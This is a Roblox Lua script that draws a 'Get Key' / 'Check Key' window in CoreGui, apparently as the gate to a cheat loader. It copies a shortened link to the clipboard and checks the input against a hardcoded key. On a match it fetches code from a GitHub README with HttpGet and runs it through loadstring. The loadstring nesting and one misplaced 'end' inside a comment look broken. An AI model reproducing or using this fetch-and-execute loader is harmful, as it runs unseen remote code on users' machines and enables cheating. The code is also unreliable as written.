-- Gui to Lua
-- Version: 3.2

-- Instances:

local GetKey = Instance.new("ScreenGui")
local ui_key = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextBox = Instance.new("TextBox")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
local getkey = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
local UIGradient = Instance.new("UIGradient")
local Check = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")

--Properties:

GetKey.Name = "GetKey"
GetKey.Parent = game.CoreGui
GetKey.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ui_key.Name = "ui_key"
ui_key.Parent = GetKey
ui_key.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ui_key.BorderColor3 = Color3.fromRGB(0, 0, 0)
ui_key.BorderSizePixel = 0
ui_key.Position = UDim2.new(0.357889235, 0, 0.312030077, 0)
ui_key.Size = UDim2.new(0.28422153, 0, 0.375939846, 0)

UICorner.Parent = ui_key

TextBox.Parent = ui_key
TextBox.BackgroundColor3 = Color3.fromRGB(27, 19, 255)
TextBox.BackgroundTransparency = 0.800
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0202205889, 0, 0.0599999987, 0)
TextBox.Size = UDim2.new(0.957720578, 0, 0.166666672, 0)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = "Key"
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true

UIAspectRatioConstraint.Parent = TextBox
UIAspectRatioConstraint.AspectRatio = 10.420

UITextSizeConstraint.Parent = TextBox
UITextSizeConstraint.MaxTextSize = 50

getkey.Name = "getkey"
getkey.Parent = ui_key
getkey.BackgroundColor3 = Color3.fromRGB(0, 81, 255)
getkey.BorderColor3 = Color3.fromRGB(0, 0, 0)
getkey.BorderSizePixel = 0
getkey.Position = UDim2.new(0.0202205889, 0, 0.323333323, 0)
getkey.Size = UDim2.new(0.957720578, 0, 0.166666672, 0)
getkey.Font = Enum.Font.Unknown
getkey.Text = "Get Key"
getkey.TextColor3 = Color3.fromRGB(255, 255, 255)
getkey.TextScaled = true
getkey.TextSize = 14.000
getkey.TextWrapped = true

UICorner_2.Parent = getkey

UIAspectRatioConstraint_2.Parent = getkey
UIAspectRatioConstraint_2.AspectRatio = 10.420

UITextSizeConstraint_2.Parent = getkey
UITextSizeConstraint_2.MaxTextSize = 50

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 38, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(201, 7, 255))}
UIGradient.Rotation = 68
UIGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 0.16), NumberSequenceKeypoint.new(0.15, 0.64), NumberSequenceKeypoint.new(1.00, 0.12)}
UIGradient.Parent = ui_key

Check.Name = "Check"
Check.Parent = ui_key
Check.BackgroundColor3 = Color3.fromRGB(0, 81, 255)
Check.BorderColor3 = Color3.fromRGB(0, 0, 0)
Check.BorderSizePixel = 0
Check.Position = UDim2.new(0.0202205889, 0, 0.560000002, 0)
Check.Size = UDim2.new(0.957720578, 0, 0.166666672, 0)
Check.Font = Enum.Font.Unknown
Check.Text = "Check Key"
Check.TextColor3 = Color3.fromRGB(255, 255, 255)
Check.TextScaled = true
Check.TextSize = 14.000
Check.TextWrapped = true

UICorner_3.Parent = Check

UIAspectRatioConstraint_3.Parent = Check
UIAspectRatioConstraint_3.AspectRatio = 10.420

UITextSizeConstraint_3.Parent = Check
UITextSizeConstraint_3.MaxTextSize = 50

UIAspectRatioConstraint_4.Parent = ui_key
UIAspectRatioConstraint_4.AspectRatio = 1.813

-- Scripts:

local function GPKUSWF_fake_script() -- getkey.LocalScript 
	local script = Instance.new('LocalScript', getkey)

	script.Parent.MouseButton1Click:Connect(function()
		setclipboard(tostring("https://shorturl.at/brVY3"))
		--[[
		game.StarterGui:SetCore("SendNotification", {
			Title = "do you want to copy Website";
			Text = "Getkey!";
			Icon = "rbxassetid://145360599";
			Button1 = "Copy";
			Button2 = "No Thank";
			Callback = script.Button_Click
		})
		-]]
	end)
	--[[
	script.Button_Click.OnInvoke = function(buttonText)
		if buttonText == "Copy" then
			setclipboard(tostring("https://shorturl.at/brVY3"))
		elseif buttonText == "No Thank" then
			print("ok")
		else
			return
		end
	end
end
--]]
coroutine.wrap(GPKUSWF_fake_script)()
local function NXQEBG_fake_script() -- Check.LocalScript 
	local script = Instance.new('LocalScript', Check)

	local key = {
		["Key1"] = "Csdj910-3u90us"
	}
	
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.TextBox.Text == key.Key1 then
				script.Parent.Parent.Parent.ui_key.Visible = false
				--[[
			game.StarterGui:SetCore("SendNotification", {
				Title = "success";
				Text = "Thank you";
				Icon = "rbxassetid://12900311398";
			})
			--]]
			wait(2)
			loadstring(loadstring(game:HttpGet("https://raw.githubusercontent.com/Aegona/Execute_V1/main/README.md"))())
		end
	end)
end
coroutine.wrap(NXQEBG_fake_script)()
